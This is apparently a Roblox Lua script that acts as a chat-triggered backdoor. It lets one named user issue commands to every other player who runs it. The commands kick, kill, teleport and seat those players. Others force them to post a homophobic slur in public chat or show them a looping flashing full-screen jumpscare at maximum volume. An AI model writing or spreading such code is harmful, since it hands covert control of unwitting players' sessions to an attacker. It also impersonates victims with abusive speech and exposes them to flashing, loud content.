local user_premium__001 = game.Players.FlavorgamerYT
local player = game.Players.LocalPlayer

-- Define a function to make the player character sit
local function sit()
    local character = game.Players.LocalPlayer.Character
    if character then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.Sit = true
        end
    end
end

-- Define a function to make the player character stand up
local function standUp()
    local character = game.Players.LocalPlayer.Character
    if character then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.Sit = false
        end
    end
end

local function dieMyCharacter()
    local character = player.Character
    if character then
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.Health = 0
        end
    end
end

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".error .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".troll .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
		end
	end

end)


user_premium__001.Chatted:connect(function(cht)
	if cht:match(".kick .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer:Kick("You have been kicked.")
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".sit .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			sit()
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".unsit .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			standUp()
		end
	end

end)


user_premium__001.Chatted:connect(function(cht)
	if cht:match(".kill .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			dieMyCharacter()
		end
	end

end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".bring .") then
		if game.Players.LocalPlayer ~= user_premium__001 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__001.Character.UpperTorso.Position)
		end
	end

end)

local me = "FlavorgamerYT" -- You don't get jumpscared.

user_premium__001.Chatted:connect(function(cht)
    if cht:match(".jumpscare .") then
        if game.Players.LocalPlayer ~= user_premium__001 then
            while wait() do
                for i,v in pairs(game.Players:GetPlayers()) do
                    if v.Name ~= me and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
                        spawn(function()
                            local newgui = Instance.new("ScreenGui",v.PlayerGui)
                            newgui.Name = "Screamer"
                            local newimage = Instance.new("ImageLabel",newgui)
                            newimage.Image = "rbxassetid://10816504761"
                            newimage.Size = UDim2.new(1,0,1,0)
                            local s = Instance.new("Sound",newgui)
                            s.SoundId = "rbxassetid://157636218"
                            s.Volume = 99
                            s.Looped = false
                            s:Play()
                            print("Jumpscared "..v.Name)
                            while wait() do
                                newimage.ImageColor3 = Color3.new(math.random(1,255)/255,math.random(1,255)/255,math.random(1,255)/255)
                                wait()
                                newimage.ImageColor3 = Color3.new(1,1,1)
                            end
                        end)
                    end
                end
            end
        end
    end
end)

user_premium__001.Chatted:connect(function(cht)
	if cht:match(".cmds") then
		if game.Players.LocalPlayer == user_premium__001 then
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "Commands";
	Text = ".bring .troll .kill .kick .error .sit";
	Time = 15;
	Icon = "rbxassetid://3463417164";
})
		end
	end

end)
